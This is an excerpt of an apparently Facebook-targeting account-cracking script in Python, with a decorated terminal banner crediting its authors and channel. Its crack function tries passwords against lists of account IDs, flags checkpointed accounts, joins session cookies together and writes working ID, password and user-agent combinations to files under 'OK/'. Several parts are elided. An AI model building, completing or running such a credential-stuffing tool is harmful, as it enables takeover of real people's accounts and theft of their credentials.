...
\033[0;34m╔══\033[0;32m[•] 𝐔𝐏𝐃𝐀𝐓𝐄 𝐁𝐘          \033[0;34m╔══\033[0;32m[•] @l4m_rawa
\033[0;34m╔══\033[0;32m[•] OWNER         \033[0;34m╔══\033[0;32m[•] 𝐁𝐀𝐇𝐄𝐙🔥
\033[0;34m╠══\033[0;91m[•] CH            \033[0;34m╠══\033[0;91m[•] @p0wer404
\033[0;34m╚══\033[0;32m[•] BRO           \033[0;34m╚══\033[0;32m[•] 𝐁𝐀𝐇𝐄𝐙""")
# LOGIN
# new cooki 
def login():
	os.system('clear')
	...
	print('\033[1;34m%s\033[1;36m[] %s%s%s \033[1;32m└\033[1;32m[1] [𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄] %s%s%s'%(P,H,P,H,P,H,P))
...
def crack(idf,pwv):
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[1;34m└[ 𝐁𝐀𝐇𝐄𝐙❌CP ] ID : {idf}  [+] PASSWORD : {pw}{N} ')       
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;32m└[ BATAm709✅OK ]\n \033[1;35mACCOUNT💚USER : {idf}   [+] ACCOUNT PASS💚 : {pw}      ')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
